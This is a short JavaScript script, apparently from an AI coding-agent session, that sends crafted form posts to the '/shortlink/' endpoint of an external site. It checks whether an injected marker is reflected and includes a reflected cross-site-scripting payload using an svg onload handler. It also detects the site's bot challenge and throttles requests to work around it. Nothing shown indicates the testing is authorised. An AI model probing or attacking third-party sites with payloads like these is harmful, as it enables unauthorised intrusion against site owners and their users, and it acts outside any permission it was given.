import { makeClient } from './lib.mjs';
import fs from 'fs';
const c = makeClient('https://tutorialinjectid.my.id');
const sleep = ms => new Promise(r => setTimeout(r, ms));
await c.get('/shortlink/');
for (const [label, body] of [
  ['marker-shrt', 'url=ZZMARKERZZhttps://google.com&id=shrt'],
  ['marker-del', 'url=ZZMARKERZZ&id=del'],
  ['xss-attr', 'url=%22%3E%3Csvg%2Fonload%3Dalert(1)%3EZZMARKERZZ&id=del'],
]) {
  const r = await c.get('/shortlink/', { method: 'POST', body, headers: { 'content-type': 'application/x-www-form-urlencoded' } });
  if (/wsidchk/.test(r.body)) { fs.writeFileSync('/tmp/opencode/sl_' + label + '.html', r.body); console.log(label, '-> kena challenge, len', r.body.length); await sleep(1500); continue; }
  fs.writeFileSync('/tmp/opencode/sl_' + label + '.html', r.body);
  const has = r.body.includes('ZZMARKERZZ');
  const i = r.body.indexOf('ZZMARKERZZ');
  console.log(label.padEnd(12), 'status', r.status, 'len', r.body.length, 'marker ADA?', has);
  if (has) console.log('   RAW:', r.body.slice(Math.max(0, i - 220), i + 120).replace(/\s+/g, ' '));
  await sleep(1500);
}
